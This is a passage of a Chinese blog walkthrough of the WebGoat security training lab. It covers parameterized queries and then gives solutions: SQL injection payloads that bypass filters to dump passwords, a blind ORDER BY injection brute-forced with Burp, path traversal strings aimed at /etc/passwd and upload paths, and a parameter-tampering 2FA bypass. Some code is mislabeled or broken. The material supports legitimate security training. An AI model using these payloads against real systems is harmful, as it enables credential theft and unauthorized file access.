class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - Java Example（java案例）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">loadAccount</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// Parser returns only valid string data</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">accountID</span> <span class="operator">=</span> getParser().getStringParameter(ACCT_ID, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?&quot;</span>;</span><br><span class="line">  <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query)) &#123;</span><br><span class="line">     statement.setString(<span class="number">1</span>, accountID);</span><br><span class="line">     <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line">     <span class="keyword">if</span> (results != <span class="literal">null</span> &amp;&amp; results.first()) &#123;</span><br><span class="line">       results.last(); <span class="comment">// Only one record should be returned for this query</span></span><br><span class="line">       <span class="keyword">if</span> (results.getRow() &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">         data = processAccount(results);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// Handle the error - Database integrity issue</span></span><br><span class="line">       &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">// Handle the error - no records found &#125;</span></span><br><span class="line">     &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException sqle) &#123;</span><br><span class="line">    <span class="comment">// Log and handle the SQL Exception &#125;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ai给出的解释：</p><p><code>PreparedStatement</code> 是 Java JDBC 中的一个接口，它表示一个预编译的 SQL 语句。预编译的 SQL 语句可以在多次执行时重复使用，这可以提高执行效率。此外，<code>PreparedStatement</code> 还可以防止 SQL 注入攻击，因为它允许你将参数作为预编译语句的一部分，而不是直接将参数嵌入到 SQL 语句中。</p><p>使用 <code>PreparedStatement</code> 的主要好处是：</p><ol><li><strong>性能优化</strong>：预编译的 SQL 语句只需要被解析和编译一次，然后可以多次执行。这通常比使用 <code>Statement</code> 对象更快，因为它避免了重复的解析和编译开销。</li><li><strong>防止 SQL 注入</strong>：通过使用参数化查询，你可以避免 SQL 注入攻击。当使用 <code>PreparedStatement</code> 时，参数值不会被解释为 SQL 代码，而是作为数据传递，从而提高了安全性。</li><li><strong>灵活的查询</strong>：你可以使用 <code>PreparedStatement</code> 的 <code>setXXX()</code> 方法（例如 <code>setString()</code>, <code>setInt()</code>, <code>setDouble</code> 等）来设置参数值，这使得查询更加灵活和易于管理。</li></ol><p>以下是一个简单的示例，演示如何使用 <code>PreparedStatement</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PreparedStatementExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mydatabase&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;username&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;password&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;John&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">email</span> <span class="operator">=</span> <span class="string">&quot;john@example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT status FROM users WHERE name=? AND mail=?&quot;</span>;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line">            ps.setString(<span class="number">1</span>, name);</span><br><span class="line">            ps.setString(<span class="number">2</span>, email);</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Status: &quot;</span> + rs.getString(<span class="string">&quot;status&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的示例中，我们首先创建一个到数据库的连接，然后准备一个预编译的 SQL 查询。接下来，我们使用 <code>setString()</code> 方法为占位符设置值，并执行查询。最后，我们遍历结果集并打印出状态信息。</p><h4 id="5-6">5.</h4><p>您可以在下面看到一些代码，但这些代码不完整。完成代码，使其不再容易受到 SQL 注入的攻击！使用您之前学过的类和方法。</p><p>代码必须根据用户的名称和邮件地址检索用户的状态。名称和邮件均采用字符串格式。</p><p>根据题意，使用PreparedStatement查询数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这行代码使用DriverManager类的getConnection方法来建立与数据库的连接。它需要三个参数：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBURL`：数据库的URL或地址。</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBUSER`：用于连接到数据库的用户名。</span>  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">`DBPW`：用于连接到数据库的密码。通过这些参数，代码尝试与数据库建立连接，并将返回的`Connection`对象存储在名为`conn`的变量中。</span></span><br><span class="line">Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这行代码创建了一个PreparedStatement对象。PreparedStatement是用来执行参数化SQL查询的。这里，它创建了一个查询，该查询从名为“<span class="built_in">users</span>”的表中选择“status”字段，其中“name”和“mail”字段的值必须与给定的参数匹配。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> `?`：这些是参数占位符。在后续的代码中，我们将使用`setString`方法为这些占位符设置实际的值。使用参数化查询的好处是可以防止SQL注入攻击，并且可以更有效地与数据库通信。</span></span><br><span class="line">PreparedStatement ps = conn.prepareStatement(&quot;SELECT status FROM users WHERE name</span><br><span class="line">? AND mail=?&quot;);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这行代码为第一个参数占位符设置了值。它将第一个占位符的值设置为变量name的值。在这个上下文中，我们可以认为这是将查询中的“name”字段的值设置为某个特定的用户名。</span></span><br><span class="line">ps.setString(1, name);</span><br><span class="line">ps.setString(2, mail);</span><br></pre></td></tr></table></figure><h4 id="6-4">6.</h4><p>试试吧！编写安全代码<br>现在是时候编写自己的代码了！ 您的任务是使用 JDBC 连接到数据库并从中请求数据。</p><p>要求：</p><ol><li><p>连接到数据库</p></li><li><p>对不受 SQL 注入攻击的数据库执行查询</p></li><li><p>查询需要包含至少一个字符串参数</p></li></ol><p>开始之前的一些提示：<br>要连接到数据库，您可以简单地假设给定的常量 DBURL、DBUSER 和 DBPW。<br>查询的内容无关紧要，只要 SQL 有效且满足要求即可。<br>您编写的所有代码都将插入到已导入 java.sql.* 的名为“TestClass”的 Java 类的 main 方法中。</p><p>没有足够的创意来思考自己的问题？您尝试从名为 users 的虚构数据库表中检索具有特定名称的用户的数据怎么样？</p><p>例如：下面的代码可以编译而不会出现任何错误（但当然不符合完成本课的要求）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    Connection conn = null;</span><br><span class="line">    System.out.println(conn);   //should output &#x27;null&#x27;</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    System.out.println(&quot;Oops. Something went wrong!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用您的知识，在下面的编辑器窗口中从头开始编写一些有效的代码！ （如果您无法在那里输入，调整一次浏览器窗口的大小可能会有所帮助，那么它应该可以工作）：</p><p>因为已经导入所有包了，现在只需要写主要代码就行了</p><p>主要不要忘记<code>ResultSet res = ps.executeQuery();</code>施行查询操作</p><blockquote><p><code>ResultSet res = ps.executeQuery();</code> 是在Java的JDBC（Java Database Connectivity）编程中常见的一行代码，它执行一个SQL查询并返回一个<code>ResultSet</code>对象。</p><ul><li><code>ps</code> 是一个 <code>PreparedStatement</code> 对象，它包含了一个预编译的SQL查询。</li><li><code>executeQuery</code> 是 <code>PreparedStatement</code> 的一个方法，用于执行查询并返回一个 <code>ResultSet</code> 对象。</li><li><code>ResultSet</code> 对象包含了查询的结果集，你可以使用 <code>ResultSet</code> 的方法来获取和处理查询返回的数据。</li></ul><p>具体来说，这一行代码执行SQL查询，并将结果存储在<code>res</code>变量中，然后你可以使用这个 <code>ResultSet</code> 对象来处理查询返回的数据。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">    Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line">    String sql = &quot;select * from users where name = ?&quot;;</span><br><span class="line">    PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="line">    ps.setString(1, &quot;name&quot;);</span><br><span class="line">    ResultSet res = ps.executeQuery();</span><br><span class="line">&#125; catch (Exception e) &#123;</span><br><span class="line">    System.out.println(&quot;Oops. Something went wrong!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7">7</h4><p>上面是java，<a href="http://xn--3dsq36aj9j.net">现在是.net</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Parameterized Queries - .NET</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> bool <span class="title function_">isUsernameValid</span><span class="params">(string username)</span> &#123;</span><br><span class="line"><span class="type">RegEx</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Regex</span>(<span class="string">&quot;^[A-Za-z0-9]&#123;16&#125;$&quot;</span>);</span><br><span class="line">Return r.isMatch(username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SqlConnection conn is set and opened elsewhere for brevity.</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">string</span> <span class="variable">selectString</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM user_table WHERE username = @userID&quot;</span>;</span><br><span class="line"><span class="type">SqlCommand</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlCommand</span>( selectString, conn );</span><br><span class="line"><span class="keyword">if</span> ( isUsernameValid( uid ) ) &#123;</span><br><span class="line">cmd.Parameters.Add( <span class="string">&quot;@userID&quot;</span>, SqlDbType.VarChar, <span class="number">16</span> ).Value = uid;</span><br><span class="line"><span class="type">SqlDataReader</span> <span class="variable">myReader</span> <span class="operator">=</span> cmd.ExecuteReader();</span><br><span class="line"><span class="keyword">if</span> ( myReader ) &#123;</span><br><span class="line"><span class="comment">// make the user record active in some way.</span></span><br><span class="line">myReader.Close();</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// handle invalid input &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception e) &#123; <span class="comment">// Handle all exceptions... &#125;</span></span><br></pre></td></tr></table></figure><h4 id="9-2">9.</h4><p>给了个文章让我们去看</p><p><a href="https://twitter.com/marcan42/status/1238004834806067200?s=21">https://twitter.com/marcan42/status/1238004834806067200?s=21</a></p><p>但是我去看的时候发现文章没了。。。</p><p>直接看题吧</p><p>通过尝试发现过滤了空格</p><p>我们直接其他符号绕过就行了</p><p>我用的是 <code>/**/</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;/**/UNION/**/SELECT/**/userid,user_name,/**/password,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,1/**/from/**/user_system_data--&#x27;</span><br></pre></td></tr></table></figure><p>然后用<code>//</code>注释符号也行</p><h4 id="10-2">10.</h4><p>我们先尝试输入</p><p>发现每一次输入select 和 from在返回的结果中都会消失</p><p>说明这题除了过滤了空格，也过滤了关键字，即select，from，我们双写绕过就行了</p><p>原理：他只会过滤一次，即SELselectECt过滤一次会变成select，从而达到绕过的效果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smith&#x27;/**/UNION/**/SELselectECT/**/userid,user_name,/**/password,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,1/**/frfromom/**/user_system_data--&#x27;</span><br></pre></td></tr></table></figure><h4 id="12-2">12.</h4><p>在此分配中，尝试通过 ORDER BY 字段执行 SQL 注入。 尝试找到服务器的 ip 地址，猜测完整的 IP 地址可能需要太长时间，因此我们为您提供最后一部分：webgoat-prdxxx.130.219.202</p><p>注意：此分配的提交字段不容易受到 SQL 注入的影响。</p><p>根据提示去按排序按钮，然后抓包，发现请求是get</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/11.png" alt=""></p><p>发送给repeater，通过修改column发现排序是按值来的</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/12.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/13.png" alt=""></p><p>输入非法字符报错，发现表名是servers</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/14.png" alt=""></p><p>构造ORDER BY语句<br>①根据上一章节11说过，有order by (case when (true/false) then ip else hostname end<br>when为true，以ip排序。为false，以hostname排序。这两个字段的排序可以直接在网页上点击排序按钮查看。<br>②之前的SQL注入中，我们使用过substr(ip,1,1)=’1’语句，返回值是boolean类型，符合①<br>③如果直接将②语句嵌套到①中的when (①)的话，这里的ip是网页上的四个ip，webgoat-prd服务器还是被隐藏着，所以我们要把②中的“ip”替换成“select ip from servers where hostname=’webgoat-prd’”。<br>根据③②①结合得到ORDER BY语句如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY (CASE WHEN (substr((select ip from servers where hostname=&#x27;webgoat-prd&#x27;),1,1)=&#x27;1&#x27;) THEN (ip) ELSE (hostname) END)</span><br></pre></td></tr></table></figure><p>然后发送到intruder模块爆破</p><p>手动替换“,”=“%2C”，空格替换为“+”号</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/15.png" alt=""></p><p>选择Cluster bomb，在第一个1和最后一个1标记</p><p>因为只需要爆破前三个ip值（后面的题目给了），然后后面值都是0-9，如此设置</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/17.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/17.png" alt=""></p><p>然后爆破，查看response部分，如果排序是按ip则正确</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/18.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/19.png" alt=""></p><p>最后可以得出IP为104.130.219.202</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/20.png" alt=""></p><h3 id="4-Path-traversal">4.Path traversal</h3><h4 id="1-2">1.</h4><p>Path traversal<br>A path(directory) traversal is a vulnerability where an attacker is able to access or store files and directories outside the location where the application is running. This may lead to reading files from other directories and in case of a file upload overwriting critical system files.</p><p>How does it work?<br>For example let’s assume we have an application which hosts some files and they can be requested in the following format: now as an attacker you are interested in other files of course so you try . In this case you try walk up to the root of the filesystem and then go into to gain access to this file. The is called dot-dot-slash which is another name for this attack.<a href="http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../">http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../</a></p><p>Of course this is a very simple example and in most cases this will not work as frameworks implemented controls for this, so we need to get a little more creative and start encoding before the request is sent to the server. For example if we URL encode you will get and the web server receiving this request will decode it again to …/…/%2e%2e%2f…/</p><p>Also note that avoiding applications filtering those encodings double encoding might work as well. Double encoding might be necessary in the case where you have a system A which calls system B. System A will only decode once and will call B with the still encoded URL.</p><p>路径遍历<br>路径（目录）遍历是一种漏洞，攻击者能够访问或存储外部的文件和目录 应用程序运行的位置。这可能会导致从其他目录读取文件，如果是文件，则会导致读取文件 上传覆盖关键系统文件。</p><p>它是如何工作的？<br>例如，假设我们有一个应用程序，它托管了一些文件，并且可以在下面请求它们 格式： 现在，作为攻击者，您当然对其他文件感兴趣，所以 你试试.在这种情况下，您尝试爬到文件系统的根目录 然后进入以获取对此文件的访问权限。称为点-点-斜杠，这是另一个名称 对于这次攻击。<code>http://example.com/file=report.pdfhttp://example.com/file=../../../../../etc/passwd/etc/passwd../</code></p><p>当然，这是一个非常简单的示例，在大多数情况下，这不会作为框架实现的控件 因此，我们需要更有创意，并在请求发送到服务器之前开始编码。 例如，如果我们对 URL 进行编码，您将得到并且接收此请求的 Web 服务器将解码 它再次更改为 …/…/%2e%2e%2f…/</p><p>另请注意，避免应用程序过滤这些编码的双重编码也可能有效。双重编码 如果系统 A 调用系统 B，则可能需要系统 A。系统 A 只会解码一次，并且 将使用仍编码的 URL 调用 B。</p><h4 id="2-4">2.</h4><p>上传文件，发现上传文件和FullName有关，即我们能控制上传文件位置</p><p>修改成<code>../</code></p><p>只要不是正确的位置都能通过</p><h4 id="3-5">3.</h4><p>过滤了<code>../</code></p><p>但是没有关系，我们换成<code>../</code>就能通过了</p><h4 id="4-4">4.</h4><p>这题就需要抓包了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/25.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/24.png" alt=""></p><p>通过返回的数据可以看出储存的位置适合shell.php有关的，我们换成<code>../shell.php</code>就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/23.png" alt=""></p><h4 id="5-7">5.</h4><p>使用路径遍历检索其他文件<br>路径遍历不仅限于文件上传，在检索文件时，路径遍历也可能是 可以从系统中检索其他文件。在此作业中，尝试查找一个名为path-traversal-secret.jpg</p><p>还是得抓包</p><p>按Show random cat picture后抓包</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/26.png" alt=""></p><p>通过返回的数据可以知道<code>?id=9.jpg</code>可以控制文件路径</p><p>我们照葫芦画瓢换成<code>../</code>提心非法字符、</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/27.png" alt=""></p><p>既然这样我们选择要转换的位置右键选择转换选择-&gt;URL-&gt;URL编码所有字符就能自动转换了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/28.png" alt=""></p><p>然后就是一步一步找了，在<code>../../</code>文件位置找到(记得转换字符)</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/29.png" alt=""></p><p>把id的值换成这个<code>../../path-traveral-secert</code>(记得转换字符，而且这里需要把jpg去掉才行，否则不行，我这里没想明白。。。有评论区大佬请告知)，然后就知道flag就似乎你的用户名用sha-512加密就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/30.png" alt=""></p><h4 id="7-2">7.</h4><p>Zip Slip 分配<br>这一次，开发人员只允许您上传 zip 文件，但是，他们犯了一个编程错误，因为上传 zip 文件会提取它，但不会替换您的图像。您能找到一种方法来绕过编程错误来覆盖当前映像吗？</p><p>这题我没想明白考点</p><p>我就直接找了一张照片压缩成zip上传就成功了。。。</p><p>本来还想抓包看看的</p><p>当我们去查看题目中的目录，发现ZIP已经被解压缩。这意味着，如果有相同文件名称的文件的话，将会被新文件覆盖。<br>正确的做法是，将所有上传的文件都经过一遍安全校验和安全设置，并将文件给一个强随机的文件名，避免文件覆盖问题。</p><h2 id="4-Broken-Authentication">4.Broken Authentication</h2><h3 id="1-Authentication-Bypass">1.Authentication Bypass</h3><h4 id="1-3">1.</h4><p>Authentication Bypasses<br>Authentication Bypasses happen in many ways, but usually take advantage of some flaw in the configuration or logic. Tampering to achieve the right conditions.</p><p>Hidden inputs<br>The simplest form is a reliance on a hidden input that is in the web page/DOM.</p><p>Removing Parameters<br>Sometimes, if an attacker doesn’t know the correct value of a parameter, they may remove the parameter from the submission altogether to see what happens.</p><p>Forced Browsing<br>If an area of a site is not protected properly by configuration, that area of the site may be accessed by guessing/brute-forcing.</p><p>身份验证绕过<br>身份验证绕过以多种方式发生，但通常会利用配置或逻辑中的某些缺陷。篡改以达到正确的条件。</p><p>隐藏输入<br>最简单的形式是依赖于网页/DOM 中的隐藏输入。</p><p>删除参数<br>有时，如果攻击者不知道参数的正确值，他们可能会从提交中完全删除该参数，以查看会发生什么情况。</p><p>强制浏览<br>如果站点的某个区域未通过配置得到适当保护，则可以通过猜测/暴力破解来访问该站点的该区域。</p><h4 id="2-5">2.</h4><p><a href="https://henryhoggard.co.uk/blog/Paypal-2FA-Bypass">案例连接</a></p><p>您正在重置密码，但从您的提供商无法识别的位置或设备进行重置。因此，您需要回答您设置的安全问题。另一个问题是 这些安全问题也存储在另一台设备上（不是与您一起），而您不记得它们。</p><p>您已经提供了您的用户名/电子邮件，并选择了其他验证方法。</p><p>其实就是照着步骤复现就是了。。。有这么简单就好了</p><p>果然删除没有作用，看了提示说是修改参数</p><p>经过尝试发现修改成secQuestion需要有两个，且参数不为0和1就行，我试过数字或则字母都行</p><p>这位博主参看了源码，而且也讲得很详细👉<a href="https://blog.csdn.net/m0_37138074/article/details/128930146">WebGoat-8.2.2版靶机学习总结_webgoat8.2.2-CSDN博客</a></p><p>通过查看代码第59/61/88行可知，当参数中存在“%secQuestion%”的变量时请求就可以通过。符号%表示任意字符/串。</p><h3 id="2-JWT-tokens">2.JWT tokens</h3><h4 id="1-Json-Web-Token">1.Json Web Token</h4><h5 id="什么是JWT">什么是JWT</h5><p>Json Web Token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>。</p><p>该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景，是目前最流行的跨域认证解决方案。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><h5 id="JWT-的原理">JWT 的原理</h5><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;姓名&quot;</span><span class="punctuation">:</span> <span class="string">&quot;张三&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;角色&quot;</span><span class="punctuation">:</span> <span class="string">&quot;管理员&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;到期时间&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p><p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p><h5 id="JWT-的数据结构">JWT 的数据结构</h5><p>实际当中 JWT 长这个样子：</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/2.png" alt=""></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkNURkh1YiIsImlhdCI6MTUxNjIzOTAyMn0.Y2PuC-D6SfCRpsPN19_1Sb4WPJNkJr7lhG6YzA8-9OQ</span><br></pre></td></tr></table></figure><p>它是一个很长的字符串，中间用点（.）分隔成三个部分。注意，JWT 内部是没有换行的</p><p>JWT 的三个部分依次如下:</p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p>写成一行，就是下面的样子。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure><p>每个部分最后都会使用 base64URLEncode方式进行编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">function base64url_encode($data) &#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(strtr(base64_encode($data), <span class="string">&#x27;+/&#x27;</span>, <span class="string">&#x27;-_&#x27;</span>), <span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/JSON%20Web%20Token/1.png" alt=""></p><h5 id="Header">Header</h5><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，以上面的例子，使用 base64decode 之后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span 